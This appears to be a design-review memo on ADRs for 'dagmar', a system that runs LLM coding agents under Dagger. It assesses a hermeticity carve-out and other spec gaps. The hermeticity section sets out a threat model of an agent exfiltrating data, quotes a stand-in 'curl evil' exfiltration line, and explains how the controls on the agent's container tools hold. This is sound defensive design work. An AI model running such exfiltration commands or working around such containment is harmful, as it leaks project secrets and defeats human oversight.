### GAP-1 (Phase-0 reads) — ✅ RESOLVED

§2 now carries an explicit **"Phase-0 reads (load-bearing, IN scope — NOT deferred)"** block:
(1) the **agent-pod image** ("the OCI image the agent pod runs — a dagmar default, overridable
per Project; without it the pod has nothing to run"); (2) the **module ref** ("which dagmar
module version the agent pod invokes, and how it is pointed at the engine on kind"). Both
declared "MVP-necessary." The Deferred section is correspondingly bounded: *"the agent-pod-image
/ module-ref provisioning **details beyond the Phase-0 MVP reads**."* The split is clean — the
MVP *reads* are in-scope; only *provisioning details* (build/publish/override mechanics) defer —
so the deferral clause can no longer sweep the MVP reads back in. Sharp enough. ✅

Minor residue (non-blocking, [HOUSE]): "overridable per Project" implies a future image-override
field whose *home* (Project CR? Agent CR? controller ConfigMap?) is unnamed. Fairly deferrable as
a "provisioning detail," but a one-line "field home → control-plane seed" would pin it.

### GAP-2 (hermeticity collision) — ✅ RESOLVED, and the carve-out is SOUND (not a hand-wave)

The carve-out: ADR-0011 §2 withholds the **raw `container` tool**; `dagmar-gate` is a **named
Dagger function**, not the raw `container` tool, so it is **not withheld**; its container-exec
network residual is *"exactly the residual ADR-0011 §3 consciously accepts"* ("a raw exec path:
the in-loop checkable, a build step"); hermetic coders therefore DO run `dagmar-gate` in-loop.

This is **substantively sound**, and here is why it is not "a distinction without a difference"
to the threat model. ADR-0011 has *two* tiers:

- **Primary threat (controlled):** the LLM exfiltrating via *its own* `Env` tools. Withholding
  the raw `container` tool removes the LLM's *arbitrary, direct* lever over networked containers
  (it cannot `container.From(...).WithExec("curl evil")`).
- **Accepted residual (ADR-0011 §3):** a deterministic raw-exec path (the in-loop checkable / a
  build step) reaching the network, bounded by ADR-0007's per-Project namespace + projected-secret
  subset.

Invoking `dagmar-gate` exercises the **second** tier (the already-accepted residual), *not* the
first — because `dagmar-gate` is a fixed, project-declared pipeline the LLM *triggers*, not an
arbitrary container op the LLM *authors*. The named-function distinction is load-bearing: it
keeps the primary-threat control intact. (Had the carve-out instead handed the hermetic coder the
raw `container` tool to run the gate, *that* would have collapsed the distinction and re-opened
the primary threat. It does not.) ✅

**[SPEC-3] non-blocking sharpening** (preempts the "distinction without a difference" reading):
the carve-out's soundness *depends on* `dagmar-gate`'s body being project-declared and
gate-reviewed (not runtime-agent-authored) and on the in-loop gate running the **pinned module
ref** (so a coder's edit to the gate fn does not take effect in-loop without first passing the
gate — ADR-0006 two-green + merge-authority). Stating that dependency explicitly pins *why* the
named-fn ≠ raw-container distinction holds against the threat model. Not required for coherence;
recommended.

## NEW findings the revision introduces

### [GAP-3] `dagmar-gate` is simultaneously "the checkable" AND "the wrapper (how)" — internal §4 tension; ADR-0003 missing from acceptance edits  *(lead finding)*

**Where:** ADR-0012 §4 body + §4 consequence + acceptance-edit list vs ADR-0003 / ADR-0009 §2 /
CONTEXT.md.

§4 contains two incompatible characterizations of `dagmar-gate`:

1. **"the checkable IS `dagmar-gate`"** — the consequence block's CONTEXT.md sharpening:
   *"the checkable IS `dagmar-gate`, a Dagger function; always-Dagger."* Here `dagmar-gate` =
   the checkable itself.
2. **"`dagmar-gate` = the wrapper (how); manifest = what"** — same consequence block: *"§2's
   `manifest = what` separation is preserved; only the wrapper (how) changes."* Here
   `dagmar-gate` = the wrapper that *consumes* manifest-declared checkables (per ADR-0009 §2:
   "`dagmar-gate` … consumes the manifest-declared checkables … does not re-declare checkables").

These cannot both be true. If `dagmar-gate` **is** the checkable (reading 1), the build/test/lint
commands live in the Dagger fn's code and the manifest's `checkables:` section is no longer the
"what" — which contradicts ADR-0009 §2's two-layer model **and** re-renders ADR-0003's required
manifest `checkables:` section redundant (a second source of truth — precisely the drift ADR-0003
rejected). If `dagmar-gate` **wraps** manifest checkables (reading 2), then it is **not** itself
the checkable, contradicting the "the checkable IS `dagmar-gate`" sharpening.

This is not hypothetical for the dogfood case: **dagmar-own's `dagmar-gate` would live in
`.dagger/` (per ADR-0010 §4, `workflows/`)** — a code-defined Dagger fn. Does that fn read
`.dagmar/project.yaml`'s `checkables:` at runtime (preserving manifest=what), or hardcode
`go build/test/vet` (making the fn the checkable and the manifest section dead)? The ADR does not
say, and the two characterizations point opposite ways.

**Consequence for the acceptance-edit list:** the list is ADR-0009 §2, ADR-0011 §2, CONTEXT.md.
**ADR-0003 is absent.** Under reading 1 (checkable = the fn), ADR-0003 ("`checkables` are
required project-specific content in the manifest") must be reconciled — either retired or
redefined — so it belongs in the list. Under reading 2, ADR-0003 is untouched but the "checkable
IS dagmar-gate" sharpening must be reworded to "the checkable *wrapper* IS `dagmar-gate`,
consuming manifest-declared checkables." Either way the current text is internally tense and the
ADR-0003 relationship is unspecified.

**Recommendation (this is the narrow revise-again):** pick one reading and make §4 consistent.
The cleaner choice — it preserves ADR-0003 + ADR-0009 §2 unchanged — is **reading 2**:
`dagmar-gate` is a Dagger *function* that is the deterministic **wrapper** (how), **consuming**
the manifest-declared `checkables:` (what) at runtime; reword the CONTEXT.md sharpening from
"the checkable IS `dagmar-gate`" to "the checkable *wrapper* IS `dagmar-gate` (a Dagger function
consuming manifest-declared checkables)." Then ADR-0003 stays as-is and need not be an acceptance
edit. (If the owner genuinely means reading 1 — the fn hardcodes the checks — then add ADR-0003
to the acceptance edits and retire/redefine the manifest `checkables:` section explicitly.)
Until §4 is disambiguated, the always-Dagger model's coherence with ADR-0003/0009 §2 is
*asserted, not grounded*.

### [SPEC-4] Always-Dagger raises the conformance floor — acknowledge the applicability consequence

**Where:** ADR-0012 §4 ("the conformance requirement strengthens: a conforming Project must be a
Dagger module exposing these two functions").

The ADR is honest that the requirement *strengthens* (a Dagger module is heavier than a Justfile
target). That is a real trade-off, not a contradiction: for dagmar's Dagger-native target set
(dagmar develops itself, and dogfooded projects are Dagger-oriented) it is natural and the
uniformity gain (one mechanism, no transport matrix) is worth it. But it does raise the floor for
*external* adoption — a plain repo that wants dagmar to operate on it must now be (or grow) a
Dagger module with two named fns in Go/TS/Python/PHP. Non-blocking; flag as a deliberate
consequence for the applicability surface, not a flaw. (The SDK-language fn bodies are bespoke per
language, but the fn *signatures* `dagmar-bootstrap`/`dagmar-gate` are uniform — coherent.)

### [HOUSE-5] `dagmar-bootstrap` in-loop cadence under-specified

§4 says "the gate-family is reused in-loop (coder self-verification)" and §5 says "the coder
self-verifies via `dagmar-gate` (in-loop)." That correctly puts only `dagmar-gate` on the
per-verify hot path (consistent with ADR-0009 §2's two-stage bootstrap→gate model and ADR-0011
§2's network-having bootstrap). But whether `dagmar-bootstrap` (dep install) runs in-loop at all
— vs. once-per-Workspace in CI/initial prep — is unstated. Presumably bootstrap once per
workspace, gate per-edit; worth one line so the in-loop cost model is unambiguous. Not a
contradiction.

  two-layer model survives only if `dagmar-gate` (fn) consumes manifest checkables; that is
  asserted, not stated.
